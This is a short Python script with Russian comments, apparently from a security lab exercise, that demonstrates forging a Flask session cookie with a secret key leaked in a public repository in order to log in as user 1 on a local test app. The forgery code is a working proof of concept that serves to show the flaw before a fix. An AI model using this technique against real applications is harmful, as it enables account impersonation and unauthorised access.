"""Демонстрация (до исправления): с известным ключом из репозитория сессию можно подделать."""
import shutil, sys, tempfile, os
from pathlib import Path
sys.path.insert(0, os.getcwd())
sys.path.insert(0, os.path.join(os.getcwd(), "testing", "lab10"))
from app import create_app
from src.db import init_db

tmp = Path(tempfile.mkdtemp()) / "demo.db"
init_db(str(tmp), reset=True)
app = create_app({"DATABASE": str(tmp), "SECRET_KEY": "dev-only-change-me", "TESTING": False, "DEBUG": False})
# Атакующий НЕ имеет доступа к серверу: ему известен только ключ из публичного репозитория.
forged = app.session_interface.get_signing_serializer(app).dumps({"user_id": 1})
client = app.test_client()
client.set_cookie("session", forged)
resp = client.get("/api/me")
print("статус:", resp.status_code)
print("тело:", resp.get_data(as_text=True)[:200])
